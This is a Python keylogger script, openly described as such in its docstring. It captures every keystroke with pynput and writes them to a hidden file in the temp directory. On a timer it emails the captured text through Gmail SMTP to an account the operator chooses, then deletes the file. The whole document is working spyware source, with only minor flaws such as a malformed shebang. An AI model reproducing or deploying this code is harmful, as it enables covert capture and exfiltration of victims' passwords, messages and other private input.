#!user/bin/env

r""" This script is a key logger. It stores the key strokes in a file('zlog.txt) in the temp directory of the system and after regular intervals mail them to the user.
     The server used to send mails are smtp.
     This script accepts 4 inputs -
    * File writing interval : It is the time interval after which the key strokes are saved in the file.
    * Mail sending interval : It is the time interval after which a mail is sent to the given username.
    * Username              : It is the mail id to which the mail is sent.
    * Password              : It is the password of that mailing id.

    The modules imported in the script are >>>
    * pynput.keyboard : Pynput is a module which used for capturing devices like mouse clicks, keyboard strokes,etc.
    * threading       : Threading module is used to make the program multithreaded.
    * smtplib         : smtp (Simple Mail Tranfer Protocol) are used to send mails
    * os              : os module is used to change directory , remove files or os related jobs
    * tempfile        : tempfile module is used to get the path of temp directory
"""

import pynput.keyboard
import threading
import smtplib
import os
import tempfile


class Keylogger:
    def __init__(self, interval, username, password, mail_interval):
        temp_dir = tempfile.gettempdir()
        os.chdir(temp_dir)
        self.log = "\t\t\tKey logger Started !!!\n\n"
        self.interval = interval
        self.username = username
        self.password = password
        self.send_mail_time = mail_interval
        self.report()

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_pressed(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def send_mail(self, email, password):
        try:
            with open("zlog.txt","r") as zlog:
                message = "\n\n\n" + zlog.read()
                zlog.close()
            os.remove("zlog.txt")
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
            timer = threading.Timer(self.send_mail_time, self.send_mail, [self.username,self.password])
            timer.start()
        except IOError:
            pass

    def report(self):
        with open("zlog.txt","a") as zlog:
            zlog.write(self.log)
            self.log = ""
            zlog.close()
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_pressed)
        with keyboard_listener:
            self.report()
            self.send_mail(self.username, self.password)
            keyboard_listener.join()


interval = int(input("File writing interval   :   "))
mail_interval = int(input("Mail sending interval   :   "))
username = raw_input("Username   :   ")
password = raw_input("Password    :   ")
key_log = Keylogger(interval, username, password, mail_interval)
key_log.start()